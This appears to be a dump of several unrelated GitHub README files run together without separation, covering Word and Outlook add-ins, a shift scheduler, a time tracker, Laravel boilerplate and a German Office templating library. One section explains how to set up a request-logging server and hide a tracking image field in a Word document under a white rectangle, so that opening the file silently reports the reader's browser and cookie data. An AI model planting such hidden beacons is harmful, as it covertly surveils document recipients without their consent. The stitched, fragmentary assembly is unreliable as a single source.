
body.AppendChild(new Paragraph(runs))
```
Example with 5 runs:

- The ability to create tables quickly:
```cs
body.AppendChild(QTable.Create(new[]
{
	new[] { ""1"", ""John"", ""Doe"" },
	new[] { ""2"", ""Jane"", ""Doe"" },
	new[] { ""3"", ""John"", ""Smith"" },
	new[] { ""4"", ""Jane"", ""Smith"" }
}));
```

---
- The ability quickly merge cells:
```cs
// Merge cells [0,0] and [1,0] (vertically)
table.Rows(0)?.Cells(0)?.VerticalMerge(MergedCellValues.Restart);
table.Rows(1)?.Cells(0)?.VerticalMerge(MergedCellValues.Continue);

// Merge cells [2,0] and [3,0] (vertically)
table.Rows(2)?.Cells(0)?.VerticalMerge(MergedCellValues.Restart);
table.Rows(3)?.Cells(0)?.VerticalMerge(MergedCellValues.Continue);
```
Example:

![image](https://github.com/Nickelony/QuickWord.OpenXml/assets/20436882/ce0cbcd7-e7fc-4f73-bcb2-95d589de3e02)

- The ability to quickly create formatted rows and cells:
```cs
table1.AppendChild(QTableRow.Create(
	new[] { ""ID"", ""First Name"", ""Last Name"" },
	rowFormatting: new TableRowFormatting { IsHeader = true },
	runFormatting: new RunFormatting { Bold = true }));
```
- The ability to easily customize existing table cells:
```cs
foreach (TableCell? cell in table2.GetColumnOfCells(3).Skip(1)) // 4th column of cells, skip header cell
{
	if (cell?.Paragraphs(0)?.GetText() == ""Yes"")
		cell?.FillColor(""LightGreen"");
	else
		cell?.FillColor(""LightPink"");
}
```

## Project Description
Adds extended appointment calendar to see events for several upcoming days, and enhanced new email notification system to delete/flag incoming emails.

This project was born because after moving to the new Outlook 2013, a lot of nice and useful features were strangely ""lost"" in the upgrade from versions like 2010 or even 2007.

It started as a personal project to include these options in my own daily work, but some colleagues were interested in it, so I decided to include it here for everybody to download and mess around with it if you like it too. You're absolutely free to download it, and do whatever you want to do with the code if you wish, which BTW is provided as-is. ;-)

You can download the compiled binaries here:

[http://blog.gamosoft.com/outlook-2013-calendar-add-in/](http://blog.gamosoft.com/outlook-2013-calendar-add-in/)

[![Buy me a beer](./images/Home_buy-me-a-beer-small.png)](https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=ZXYEC3PM6K7TQ&lc=US&item_name=Outlook2103AddInBuyBeer&currency_code=USD&bn=PP%2dDonationsBF%3amybutton%2epng%3aNonHosted) If you find it useful and have spare time you can drop me a line saying how you like the tool and such, or better yet, you can buy me a beer if you wish. ;-) 


You will have to uninstall any previous version (add/remove programs) if you had installed it before.
You might need to install it as an administrator to avoid issues.

Before unzipping the file please ""unblock"" it (right-click -> properties -> unblock) to avoid issues when installing, then unzip the file and double-click the VSTO file on the root folder to install it. Some people suggest downloading it with different browsers as well (please read the issues and discussions lists).

If you don't unblock the file you'll get the following error:

![Certificate Installation Error](./images/Home_OutlookAddIn.JPG)

## Upcoming appointments

One of the things that I missed a LOT from 2010 was the ability to see upcoming appointments for the following days in the to-do task pane.

It's very weird but in version 2013 this option has disappeared, so you can only see the appointments for the current day, which most people may not think of it as a big issue, but say you have a meeting tomorrow at 6:30 am, you won't be able to see it today and could probably miss it... ;-)

For this I have implemented a new pane that docks to the right of the Outlook window and shows the calendar and a list of future appointments within a certain range of upcoming days:

![Future Appointments](./images/Home_Appointments_v6.png)

It will show appointments with their categories and status similar to what it did in Outlook 2010.

I have implemented basic functionality, such as double-clicking the item to open it up (and in case of a recurring meeting to either open one or all of them):

![Open all instances or current one](./images/Home_Recurring.png)

You can also right-click an item and select ""Reply all with email"" to create a new mail item with all recipients of the appointment.
Now you can delete appointments (whether one or multiple occurrences) directly from this pane, after a confirmation message is shown to the user:

![Reply all attendees with an email and delete appointments directly here](./images/Home_reply_all_3.png)

Synchronization is not 100%, so if you create or delete an appointment it will not automatically show up in the new list. The list currently responds to date changes and number of upcoming days, so I've also provided a way to reload all appointments by clicking on the ""today"" link (the current date, next to the gear icon to open up the settings dialog).

This is not very polished and some bugs may come up, so please let me know and I'll try my best to fix them. Also suggestions are welcome (depending on my availability).

## Tasks and To-Do Items
Finally, after many people requesting it, I included a second panel underneath that will show the tasks in the system sorted by due date (if option selected in the configuration).
It shows the task subject, categories (if any) and reminder time. If no reminder time has been set it'll show the task start date.

![Tasks](./images/Home_Tasks1.png)

Please note this is still work in progress and I just released it to see people's comments and expand on this. Double-clicking the task should open up the item to take the necessary action on it, as well as right-clicking on a task will present options to complete or delete a task.
A known issue is that it doesn't fully restore the scrollable splitter between panels, but I will look into that time permitting. ;-)

## Multiple calendars
It was a very popular request to add support for multiple calendars and now the appointments shown in the pane will be selected from the configured list of calendars to choose from (see configuration below). As of now only those calendars under the ""My Calendars"" section will show up, and there are some timeout issues with accounts such as ""public folders"".
Also they will show in the same font/color, so drop me a line on a suggestion to better show them, as I think the look and feel may be confusing with color categories.

## Configuration
Configuration can be accessed now through the little gear icon in the calendar, to claim more space for items (after removing the buttons). You can select the following options:

- Number of days to show from the selected date onwards.
- Allow users to show/hide previous appointments in the day.
- Enable/disable new email alert notifications.
- Seconds the email alert pop-up remains visible in the screen.
- Show/hide friendly group header names for specific dates (yesterday, today and tomorrow).
- Show/hide an additional column with the week numbers.
- Show/hide tasks panel.
- Allow to see tasks already marked as completed or not.
- Choose first day of the week.
- List of accounts to show calendars from.

![Configuration options](./images/Home_Configuration6.png)

## Email notifications
Another thing that is really frustrating (IMHO) is the new email alert system that's implemented in Outlook 2013. It just shows a summary of the email and you can only click it to open the email, or dismiss the alert.

In previous versions you also had the option to either delete it directly from the notification window (bye bye spam!) or even flag it, so that's what I have implemented here:

![Email alert with additional options](./images/Home_Notification_v2.png)

I've also added a dropdown list that allows the user to move incoming email messages to the desired folder if something is selected (just by choosing an entry in the list, so be careful).

## Email appointments
A new feature introduced is the ability to create appointments by dragging & dropping emails into one day of the calendar. It will use all recipients in the selected emails to do so, and the last email body and subject to compose the appointment.
By default will create it on the designated day, using current's day time rounded up within the following 15 minutes.

Remember, this was part of a personal project and I may be extending these functionalities or not depending on my availability, so use it at your own risk.

I hope you guys like it too. :-)

Kind regards.

WinstonChenn,schedule-finder,,https://github.com/WinstonChenn/schedule-finder,https://api.github.com/repos/schedule-finder/WinstonChenn,A Python program for finding optimal employee work schedules with preference constraints.,"# Employees Schedule Finding With Preference
This repo implements a simple and easy-to-use python scripts that solves the employees scheduling given preference problem.

![schedule](https://raw.githubusercontent.com/WinstonChenn/schedule-finder/main/cartoon.jpeg)
## Requirements
- [Python](https://www.python.org/)
- [Google Or-Tools](https://developers.google.com/optimization)
- [Pandas](https://pandas.pydata.org/)
- [Numpy](https://numpy.org/)
## Problem Setup
- There are <i>n</i> days of work and each day has a maximum number of <i>s</i> shifts that need to be scheduled to <i>p</i> employees. 
- Each shift only needs 1 employee to fulfill. 
- Shifts within the same day can sometimes happen at the same time (up to user interpretation) and will need different employees to fulfill. 
- Each employee can also provide a discrete preference bewteen -2 (can't do it) to 2 (I want it) for all the shifts that will be scheduled. 
- One additional employee preference includes the maximum number of back to back days one would like to have shift(s) scheduled.


## Usage
1. Setup preference inputter. 
    - The schedule finder program require using a preference inputter object to extract specific staff preferences from a staff preference file (usually in excel). 
    - We provided a interfance for such preference inputter in `src/data_process/data_interfaces` named `PreferenceInputterInterface`
    - An example of such preference inputter class can be found in `src/data_process/preference_inputters` named `ElmWinter2022PreferenceInputer`
    - Followings are the required methods for a valid preference inputter class:
        - `get_staff_name(self) -> list`: Return a list of staff names from raw data table.
        - `get_staff_pref_matrix(self, staff: str) -> numpy.ndarray`: Return the preference matrix for the given staff.
        - `get_staff_max_consecutive_shifts(self, staff: str) -> int`: Return the maximum number of consecutive shifts for the given staff.
    - Different preference file will likely require different parsing script to implement above methods, therefore we only provide an interface. 
2. Setup schedule outputter.
    - The schedule outputter objects determines how the solved schedule from google OR-tools' Constrained Programming Solver will be formatted to output to tabular format
    - We provided following interfance `ScheduleOutputterInterface` in `src/data_process/data_interfaces`
    - An example of such schedule outputter class can be found in `src/data_process/schedule_outputters` named `ElmScheduleOutputter`
    - Following are the required methods for a valid schedule outputter class:
        - `get_schedule_stats(self) -> pandas.DataFrame`: Print the shift statistics for each staff and return a pandas DataFrame that stores those statistics.
        - `get_schedule_df(self) -> pandas.DataFrame`: Return the schedule formatted in a pandas DataFrame.
        - `verify_schedule(self) -> bool`: Verify that the scheudle is valid.

3. Modify imports for customized preference inputter and schedule outputter.
    - in the `src/main.py` script, modify following two lines with your own inputter/outputter
        - https://github.com/WinstonChenn/schedule-finder/blob/e7998fe545cc511739a33395b7115dd98b5d4bdf/src/main.py#L7-L8

4. Run `src/main.py` with following args
    - file path args
        - `--data_dir`: the root data directory that stores all scheduling data
        - `--data_name`: name of the sub-directory within `data_dir` that stores scheduling data for the current scheduling finding task
        - `--raw_pref_file_name`: name of the raw preference file that will be used by `PreferenceInputter` object to extract perference data. Assumed to store in `data_dir/data_name/raw_data` folder.
        - `--unavailable_day_json_file_name`: specific shifts in specific dates/day of the week that any staffs can not work, can also be used by `PreferenceInputter` object as additional preference information. Assumed to store in `data_dir/data_name/raw_data` folder.
        - `--solution_file_name`: file name that schedule solution will be written to. Will be stored in `data_dir/data_name/solutions`.
    - Schedule requirements args
        - `--start_date`: the first date in the schedule matrix (in the formate of `--date_format`).
        - `--end_date`: the last date in the schedule matrix (in the formate of `--date_format`).
        - `--excluding_dates`: a list of dates between `--start_date` and `--end_date` that should be excluded from the schedule matrix (in the formate of `--date_format`).
        - `--max_num_shifts`: maximum number of shifts that each day in the schedule matrix will have.(the same as the <i>s</i> in the problem)
        - `--shifts_names`: a list of names for each shift. The length of this argument need to equal `--max_num_shifts`.
        - `--weekday_num_shifts`: number of valid shifts that weekdays will have. this argument needs to be less than or equal to `--max_num_shifts`. Based on the number given, the first n shifts on weekday days will be given 1 labels, and all the later shifts will be given 0 labels. 
        - `--weekend_num_shifts`: Same as the `--weekday_num_shifts`, this argument needs to be less than or equal to `--max_num_shifts`. 
        - `--special_weekdays`: A list of dates that are weekends by standard calendar, but should be considered as weekdays for shift number consideration.
        - `--special_weekends`: Same as `--special_weekends, a list of dates that are weekdays by standard calendar, but should be considered as weekends for shift number consideration.
    - Other args
        - `--date_format`: the format string used to by `datetime.strptime` to parse and generate all the date strings provided in staff preference and schedule requirement.
        - `--max_solve_time`: the maximum amount of time allowing google OR-tools to solve the schedule in seconds.",0,0,1,0,office,"[admin, office, scheduler]",0

phts,time-tracker,,https://github.com/phts/time-tracker,https://api.github.com/repos/time-tracker/phts,Track your working time,"# Working Time Tracker

A simple script to track how much time you spend near the computer in the office.

## Requirements

The script uses `xscreensaver-command -watch` output so `xscreensaver` is required as a screen locking framework.
Notifications are shown by `notify-send`.
And [Ruby](https://www.ruby-lang.org/en/) (tested on v2.2.3) is needed to be able to run the script.

Also it assumes that you do not work at nights and do not turn off your PC.

Before first run all dependencies should be installed:

    bundle install

## Usage

This script should be run during the whole session so it can be executed from *.profile* file or as a service.

To run the script from terminal emulator:

    time-tracker ~/time.txt

It generates a report file (in this case *~/time.txt*), for example:

    11.01    Started: 09:34    Finished: 17:35    Delta: 08:00    Total per week: 08:00
    12.01    Started: 10:35    Finished: 18:29    Delta: 07:54    Total per week: 15:54
    13.01    Started: 09:01    Finished: 17:20    Delta: 08:19    Total per week: 24:13

Also it creates a file (*~/time.txt.current*) which contains working time for the current day.
You can use this file wherever you want.
And it is used by Generic Monitor plugin.

For more information about options:

    time-tracker --help

## Generic Monitor plugin

Additionally the script can be used with [dnschneid/xfce4-genmon-plugin](https://github.com/dnschneid/xfce4-genmon-plugin) to display a progress bar on the panel.

    time-tracker --genmon ~/time.txt

## Notification

There is a notification if you have already been 8 hours at the office - it's time to go home.

## TeamViewer

This script doesn't treat TeamViewer sessions as working time.
So any screen lock/unlock under TeamViewer will be ignored and will not be taken into account.

Its purpose is to help my parents, so I created it very simple and without a definitive interface (it uses the system settings to display the graphical interface)... I still haven't implemented a module to export the database that it generates to a cloud, so in a future update I intend to implement this compatibility.

#####  [[Project]](https://delta-lab-iitk.github.io/CD3A//)     [[Paper Link ]](https://arxiv.org/pdf/1907.10628.pdf)

#### Abstract 
Domain adaptation is essential to enable wide usage of deep learning based networks trained using large labeled datasets. Adversarial learning based techniques have shown their utility towards solving this problem using a discriminator that ensures source and target distributions are close. However, here we suggest that rather than using a point
estimate, it would be useful if a distribution based discriminator could be used to bridge this gap. This could be achieved using multiple classifiers or using traditional ensemble methods. In contrast, we suggest that a Monte Carlo dropout based ensemble discriminator could suffice to obtain the distribution based discriminator. Specifically, we propose a curriculum based dropout discriminator that gradually increases the variance of the sample based distribution and the corresponding reverse gradients are used to align the source and target feature representations. The detailed results and thorough ablation analysis show that our model outperforms state-of-the-art results.

## About Laravel

Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable and creative experience to be truly fulfilling. Laravel takes the pain out of development by easing common tasks used in many web projects, such as:

- [Simple, fast routing engine](https://laravel.com/docs/routing).
- [Powerful dependency injection container](https://laravel.com/docs/container).
- Multiple back-ends for [session](https://laravel.com/docs/session) and [cache](https://laravel.com/docs/cache) storage.
- Expressive, intuitive [database ORM](https://laravel.com/docs/eloquent).
- Database agnostic [schema migrations](https://laravel.com/docs/migrations).
- [Robust background job processing](https://laravel.com/docs/queues).
- [Real-time event broadcasting](https://laravel.com/docs/broadcasting).

Laravel is accessible, powerful, and provides tools required for large, robust applications.

## Learning Laravel

Laravel has the most extensive and thorough [documentation](https://laravel.com/docs) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework.

If you don't feel like reading, [Laracasts](https://laracasts.com) can help. Laracasts contains over 1500 video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.

  Gotenberg Plugin
</h1>

Display office documents in the source code viewer of SCM-Manager

## Usage

Find out how this plugin works on the [plugin documentation page](https://scm-manager.org/plugins/scm-gotenberg-plugin/docs/).

## Build and testing

The plugin can be compiled and packaged with the following tasks:

* clean - `gradle clean` - deletes the build directory
* run - `gradle run` - starts an SCM-Manager with the plugin pre-installed and with livereload for the ui
* build - `gradle build` - executes all checks, tests and builds the smp inclusive javadoc and source jar
* test - `gradle test` - run all java tests
* ui-test - `gradle ui-test` - run all ui tests
* check - `gradle check` - executes all registered checks and tests (java and ui)
* fix - `gradle fix` - fixes all fixable findings of the check task
* smp - `gradle smp` - Builds the smp file, without the execution of checks and tests

For the development and testing the `run` task of the plugin can be used:

* run - `gradle run` - starts scm-manager with the plugin pre-installed.

If the plugin was started with `gradle run`, the default browser of the os should be automatically opened.
If the browser does not start automatically, start it manually and go to [http://localhost:8081/scm](http://localhost:8081/scm).

In this mode each change to web files (src/main/js or src/main/webapp), should trigger reload of the browser with the made changes.

# Host Design

See [build.sh](server/build.sh) for source on how the box is created. The script needs to be edited beforehand to ensure that appropriate IPs are added in ALLOW_IP variable. Its not clever but sets up the box as needed. Script was tested on Debian 9 x64.

The script will perform the following actions:

* Change SSH port from 22/tcp to 50055/tcp
* Install apache + php 
* Crate folder structure in /var/www/html
* Add tracking script as index.php
* Add .htaccess file hinding .php extension + add error handling
* Configured IPTABLES to allow only specific IPs to access SSH but leaves 443/80 ports open for the world. As defined by ALLOW_IP variable.
* Change Apache config to enable mod_rewrite
* Disable IPv6
* Disable NTP service

After configuration all requests will be stored in /var/www/html/cookies/ folder (easily changable in source code) however. By default this folder is denied to the world.

# Beacon Design

Beacon design is equally simple. All we are doing is inserting tracking URL that points to tracking server /index?id=XXXXXX location (replace XXXXXX with any value). Adding tracking image to document header/footer and covering it with white overlay seems to work quite nice.

The steps below show how to add working beacon to Word document.

**Open up document**

![Alt text](beacon/start.png?raw=true ""Step1"")

**Open Quick Parts > Field**

![Alt text](beacon/step1.png?raw=true ""Step2"")

**Scroll down to IncludePicture field and insert URL to server. Tick ""Data not stored with document""**

![Alt text](beacon/step2.png?raw=true ""Step3"")

**Finally remove any uncessary data from the document**

![Alt text](beacon/step3.png?raw=true ""Step4"")
![Alt text](beacon/step4.png?raw=true ""Step5"")
![Alt text](beacon/step5.png?raw=true ""Step6"")

**And cover inserted URL field with white rectangle (remember to remove borders etc)**

![Alt text](beacon/step6-custom.png?raw=true ""Step7"")


# Socat 

Sometimes its necessary to use socat for redirections if there is external box in front of the tracker. This can be easily achieved using following commands:

```
socat TCP4-LISTEN:80,fork TCP4:<DESTINATION>:<DESTINATION PORT>
```

# Beacon output 

The following sample was produced by the beacon tracking script and stored in /var/www/html/cookies/. Its basically timestamp + path + browser version + cookie value (if any added).

```

# Notes

* Beacon doesn't work unless ""Enable Content"" warning in Office is dismissed. By default ""field"" in document is not active when the origin of the document is from either network share or 'Internet'. Office will instead open ""Protected View"".
* Don't forget to change index.html to something sensible and do not leave it as start page for apache.
* HTTPS setup can be done separetly and IPTABLES are opened for this reason. Close them if you don't want/need HTTPS.
* This setup have been tested on Debian 9.3 x64 so should work on Debian in general.

![](https://img.shields.io/badge/maven-0.8.0-green)  ![Java CI with Maven](https://github.com/MZ-Entwickler/mz-office-document-api/workflows/Java%20CI%20with%20Maven/badge.svg?branch=master)  
Library to fill out Libre-/OpenOffice (`ODT`) and Microsoft Word Documents (`DOCX`; starting with Word 2007) containing place holders and nested Tables. The data model is independent of the resulting document format.

The library is not intended to create documents from scratch, instead to work with templates containing placeholders, tables with placeholders and nested sub tables (tables containing tables).

By using an abstract model layer (`com.mz.solutions.office.model`), both formats (`DOCX`/`ODT`) can be used by the same code base.

For Microsoft Word there are some extensions to use Custom XML Parts and using the functionality of `w:altChunk` to insert foreign documents inside the main document.

## License
Affero General Public License Version 3 (AGPL v3)

## Dependencies
- _Runtime_: No dependencies at runtime needed. (cool, right?)
- _Compile_: JSR 305 (Annotations for Software Defect Detection)
- _Test_: JUnit 5

The project needs Java 1.8. It is usable up to Java 13. (tested)

# Examples
In the directory `examples` there are some example projects. Further information can be found in the java doc.

# Einstieg - com.mz.solutions.office
Jeder Vorgang zum Befüllen von Textdokumenten (*.odt, *.docx, *.doct) bedarf eines
Dokumenten-Daten-Modelles das im Unterpackage 'model' zu finden ist. Nach dem Erstellen/
Zusammensetzen des Modelles oder laden aus externen Quellen, kann in weiteren Schritten mit 
diesem Package ein beliebiges Dokument befüllt werden.

## Dokumente öffnen
Alle Dokumente werden auf dem selben Weg geöffnet. Ist das zugrunde liegende Office-Format 
(ODT oder DOCX) bereits vor dem Öffnen bekannt, kann die konrekte Implementierung gewählt werden.

```java
  // for Libre/ Apache OpenOffice
  OfficeDocumentFactory docFactory = OfficeDocumentFactory.newOpenOfficeInstance();
 
  // for Microsoft Office (starting with 2007)
  OfficeDocumentFactory docFactory = OfficeDocumentFactory.newMicrosoftOfficeInstance();
```

Ist das Dokumentformat unbekannt, können die Implementierung selbst erkennen ob es sich um ihr
eigenes Format handelt.

```java
  Path anyDocument = Paths.get(""unknownFormat.blob"");
  Optional<Office> docFactory = OfficeDocumentFactory.newInstanceByDocumentType(anyDocument);
 
  if (docFactory.isPresent() == false) {
      throw new IllegalStateException(""unknown format"");
  }
```

Die Wahl zur passenden Implementierung bedarf dabei keiner korrekten Angabe der 
Dateinamenserweiterung. Die OfficeDocumentFactory und deren konkrete Implementierung erfüllt 
immer das Dokumenten-Daten-Modell vollständig.

## Konfiguration der Factory
Mögliche Konfigurationseigenschaften die für alle Implementierungen gültig sind finden sich in 
`OfficeProperty`; Implementierungs-spezifische in eigenen Klassen (z.B. `MicrosoftProperty`). Die 
Factory ist nicht thread-safe und eine Änderung der Konfiguration wikt sich auf alle bereits 
geöffneten, zukünftig zu öffnenden und derzeit in Bearbeitung befindlichen Dokumente aus.

```java
  // für OpenOffice und Microsoft Office gemeinsame Einstellung
  // (Boolean.TRUE ist bereits die Standardbelegung und muss eigentlich
  // nicht explizit gesetzt werden)
  docFactory.setProperty(OfficeProperty.ERR_ON_MISSING_VAL, Boolean.TRUE);
 
  // Selbst wenn die aktuell hinter docFactory stehende Implementierung für
  // OpenOffice ist, können für den Fall auch die Microsoft Office
  // Einstellungen hinterlegt/ eingerichtet werden. Jede Implementierung
  // achtet dabei lediglich auf die eigenen Einstellungen.
  // (dieses Beispiel ist ebenfalls eine bereits bestehende Voreinstellung)
  docFactory.setProperty(MicrosoftProperty.INS_HARD_PAGE_BREAKS, Boolean.TRUE);
```

Alle Einstellungen sollten einmalig nach dem Erstellen der Factory eingerichtet werden. Für 
Dokumente bei denen die Einstellungen abweichen, sollte eine eigene Factory verwendet werden. 
Nach der Konfiguration können alle Dokumente vom Typ der Implementierung der Factory geöffnet werden.

```java
  Path invoiceDocumentPath = Paths.get(""invoice-template.any"");
  Path invoiceOutput = Paths.get(""INVOICE-2015-SCHMIDT.DOCX"");
 
  DataPage reportData = .... // siehe 'model' Package
 
  OfficeDocumentFactory docFactory = OfficeDocumentFactory
          .newInstanceByDocumentType(invoiceDocumentPath)
          .orElseThrow(IllegalStateException::new);
 
  OfficeDocument invoiceDoc = docFactory.openDocument(invoiceDocumentPath);
  invoiceDoc.generate(reportData, ResultFactory.toFile(invoiceOutput));
```

## [Spezifisch] Apache OpenOffice und LibreOffice
_Platzhalter_ sind in OpenOffice ""Varibalen"" vom Typ ""Benutzerdefinierte Felder"" (Variables ""User 
Fields"") und findet sich im Dialog ""Felder"", unter dem Tab ""Variablen"". Die einfachen (unbenannten!)
Platzhalter von OpenOffice werden nicht unterstützt. Jeder Platzhalter (Benutzerdefiniertes Feld) 
muss in Grußbuchstaben geschrieben sein und kann (optional) einen vordefinierten Wert enthalten. 
Der Typ wird beim Ersetzungsvorgang ignoriert und zu Text umgewandelt, ebenso wie die daraus 
resultierenden Formatierungsangaben - z.B. das Datumsformat. Wenn in der Factory eingerichtet ist, 
das fehlende Platzhalter ignoriert werden sollen, werden diese Platzhalter nicht mit dem Wert 
belassen sondern aus dem Dokument entfernt. Die umgebende Schriftformatierung von Platzhaltern 
wird im Ausgabedokument beibehalten. 

_Seitenumbrüche_ sind in OpenOffice nie hart-kodiert (im Gegensatz zu Microsoft Office) und ergeben sich lediglich aus den Formatierungsangaben von Absätzen. Soll nach jeder `DataPage` ein Seitenumbruch erfolgen, muss im aller ersten Absatz des Dokumentes eingestellt sein, das (Paragraph -> Text Flow -> Breaks) vor dem Absatz immer ein Seitenumbruch zu erfolgen hat. Ansonsten werden alle `DataPage`s nur hintereinander angefügt ohne gewünschten Seitenumbruch.

_Tabellenbezeichung_ wird in OpenOffice direkt in den Eigenschaften der Tabelle unter ""Name"" hinterlegt. Der Name muss in Großbuchstaben eingetragen werden.

_Kopf- und Fußzeilen_ werden beim normalen Ersetzungsvorgang nicht berücksichtigt. Mit Dokumenten-Anweisungen können Kopf- und Fußzeilen bei ODT Dokumenten ersetzt werden. Siehe dazu Abschnitt Dokumenten-Anweisungen.

Es werden ODF Dateien ab Version 1.1 unterstützt; nicht zu verwechseln mit der OpenOffice Versionummerierung.

## [Spezifisch] Microsoft Office
_Platzhalter_ sind Feldbefehle und ensprechen den normalen Platzhaltern in Word (`MERGEFIELD`). Die Groß- und Kleinschreibung ist dabei unrelevant, sollte aber am Besten groß sein. Ein mögliches `MERGEFIELD` ohne Beispieltext sieht wie folgt aus:

```
  { MERGEFIELD RECHNUNGSNR \* MERGEFORMAT }
```

Die geschweiften Klammern sollen dabei die Feld-Klammern von Word repräsentieren. Alternativ können auch Dokumenten-Variablen als Platzhalter missbraucht werden. Wichtig: Nicht in Word einfach geschweifte Klammern schreiben! Die geschweiften Klammern werden mit `STRG+F9` erzeugt und sind in Word besondere Feldbefehle.

```
  { DOCVARIABLE RECHNUNGSNR }
```

Dokumentvariablen sollten dann jedoch keinerlei Verwendung in VBA (Visual Basic for Applications) Makros finden. Letzte Möglichkeit ist die Angabe eines unbekannten Feld-Befehls der nur den Namen des Platzhalters trägt. Diese Form sollte vermieden werden und ist nur implementiert um Fehlanwendung zu tolerieren. Ein vollständiges `MERGEFIELD` ist grundsätzlich die beste Option! Erweiterte `MERGEFIELD` Formatierungen/ Parameter (Datumsformatierungen, Ersatzwerte, ...) werden ignoriert und entfernt. Platzhalter übernehmen die umgebende Formatierung; im Feldbefehl selbst angegebene Formatierung, was eigentlich untypisch ist und nur durch spezielle Word-Kenntnisse möglich ist, werden ignoriert und aus dem Dokument entfernt.

_Seitenumbrüche_ können weich (per Absatzformatierung) oder hart (per Einstellung nach jeder `DataPage`) in Word gesetzt werden. Harte Seitenumbrüche sollten (wenn Seitenumbrüche erwünscht sind) bevorzugt werden.

_Tabellenbezeichner_ können in Word nicht direkt vergeben werden. Um einer Tabelle eine Bezeichnung/ Name zu vergeben, muss in der ersten Zelle ein unsichtbarer Textmarker hinterlegt werden, dessen Name in Großbuchstaben den Namen der Tabelle markiert.

_Kopf- und Fußzeilen_ werden beim normalen Ersetzungsvorgang nicht berücksichtigt. Mit Dokumenten-Anweisungen können Kopf- und Fußzeilen bei DOCX Dokumenten ersetzt werden.

Word-Dokumente ab Version 2007 im Open XML Document Format (DOCX) werden unterstützt.

# Daten-Modell - com.mz.solutions.office.model
Kurzlebiges Daten-Modell zur Strukturierung und späteren Befüllung von Office Dokumenten/Reports.

_Grundlegend:_
Das zur Befüllung von Dokumenten verwendete Daten-Modell ist ein kurzlebiges Modell das nur dem Zweck der Strukturierung dient. Langfristige Datenhaltung und Modellierung stehen dabei nicht im Vordergrund. Alle Modell-Klassen implementieren lediglich Funktionalität zum Hinzufügen von Bezeichner-Werte- Paaren, Tabellen und Tabellenzeilen. Eine Mutation dieser (Entfernen, Neusortieren, ...) ist nicht vorgesehen und sollte im eigenen Domain-Modell bereits erfolgt sein. Datenmodell können manuell zusammengestellt werden oder aus einer externen Quelle bezogen werden. Die Unter-Packages `json` und `xml` (in der GitHub Version noch nicht verfügbar, da noch im Beta-Status) dienen als Implementierung zum Laden von vorbereiteten externen Datenmodellen. Die Serialisierung (und damit auch das Laden und Speichern) können alternativ ebenfalls verwendet werden.

_Wurzelelement DataPage des Dokumenten-Objekt-Modells:_
Jedes Dokument (oder jede Serie von Dokumenten/Seiten) beginnen immer mit einer Instanz von `DataPage`. Eine Instanz von `DataPage` entspricht immer einem einzelnen Dokumentes oder einer Seite oder mehrerer Seiten. Die entsprechende Interpretation ist dabei abhängig, wie das Datenmodell später übergeben wird.

_Bezeichner-Werte-Paare / Untermengen (Tabellen / Tabellenzeilen):_
Die unterschiedlichen Modell-Klassen übernehmen unterschiedliche Einträge und Strukturen auf. Die folgende Auflistung sollte dabei verdeutlichen wie die Struktur von Dokumenten ist.

```
 
  x.add(y)     | DataPage    DataTable   DataTableRow    DataValue
  -------------+--------------------------------------------------------------
  DataPage     | NEIN        JA          NEIN            JA
  DataTable    | NEIN        NEIN        JA              JA*
  DataTableRow | NEIN        JA          NEIN            JA
  DataValue    | NEIN        NEIN        NEIN            NEIN
 
  * Einfache DataValue's in DataTable, werden zum Ersetzen der Kopf und
    der Fußzeile in der Tabelle verwendet; nicht zum Ersetzen von Platzhalter in den Zeilen.
``` 
 
Dabei ist zu beachten, dass `DataTable` und `DataValue` benannte Objekte sind und entsprechend eine Bezeichnung besitzen. Jede Instanz von `DataValue` besitzt einen Bezeichner (den Platzhalter) und jede Tabelle `DataTable` besitzt eine unsichtbare Tabellenbezeichnung die entweder direkt von Office als Name angegeben wird (so bei Open-Office) oder indirekt per Textmarker in der ersten Tabellenzelle versteckt angegeben wird (so bei Microsoft Office) da keine offizielle Tabellenbenennung möglich ist. Zu den genauen Unterschieden im Umgang mit Platzhaltern und Tabellennamen sollte die Package-Dokumentation von `com.mz.solutions.office` herangezogen werden.

__Beispiel:__

```java
  // Angaben im Hauptdokument
  DataPage invoiceDocument = new DataPage();
  invoiceDocument.addValue(new DataValue(""Nachname"", ""Mustermann""));
  invoiceDocument.addValue(new DataValue(""Vorname"", ""Max""));
  invoiceDocument.addValue(new DataValue(""ReDatum"", ""2015-01-01""));
 
  // Tabelle mit den Rechnungsposten
  DataTable invoiceItems = new DataTable(""Rechnungsposten"");
 
  DataTableRow invItemRow1 = new DataTableRow();
  invItemRow1.addValue(new DataValue(""PostenNr"", ""1""));
  invItemRow1.addValue(new DataValue(""Artikel"", ""Pepsi Cola 1L""));
  invItemRow1.addValue(new DataValue(""Preis"", ""1.70""))
 
  DataTableRow invItemRow2 = new DataTableRow();
  invItemRow2.addValues(   // Es gibt auch Vereinfachungen
          new DataValue(""PostenNr"", ""2""),
          new DataValue(""Artikel"", ""Kondensmilch""),
          new DataValue(""Preis"", ""0.65""));
 
  // Hinzufügen der Zeilen; Reichenfolge ist relevant
  invoiceItems.addTableRow(invItemRow1);
  invoiceItems.addTableRow(invItemRow2);
 
  // Tabelle dem Dokument/ der Seite hinzufügen
  invoiceDocument.addTable(invoiceItems);
 
  // Steuerung des Zahlungstextes
  if (invoice.isDueIn14Days()) {
      // less than 14 days to pay
      invoiceDocument.addValues(
              new DataValue(""INV_PAYMENT_TEXT_0"", StandardFormatHint.PARAGRAPH_REMOVE),
              new DataValue(""INV_PAYMENT_TEXT_1"", StandardFormatHint.PARAGRAPH_KEEP));
  } else {
      // more than 14 days to pay
      invoiceDocument.addValues(
              new DataValue(""INV_PAYMENT_TEXT_0"", StandardFormatHint.PARAGRAPH_KEEP),
              new DataValue(""INV_PAYMENT_TEXT_1"", StandardFormatHint.PARAGRAPH_REMOVE));
  }
 
  // Tabelle Skonto ausblenden bei Privatkunden
  invoiceDocument.addValue(new DataValue(""INV_TBL_SKONTO"",
          invoice.isCompanyInvoice() ? StandardFormatHint.TABLE_KEEP
                                     : StandardFormatHint.TABLE_REMOVE));
  // ...
```

# Schreiben der Ausgabe-Dokumente - com.mz.solutions.office.result
Der API wird eigentlich nicht direkt gesagt wo die Datei gespeichert werden soll. Wir haben dies,
da die Bibliothek auch server-seitig eingesetzt wird, soweit es geht umgangen.

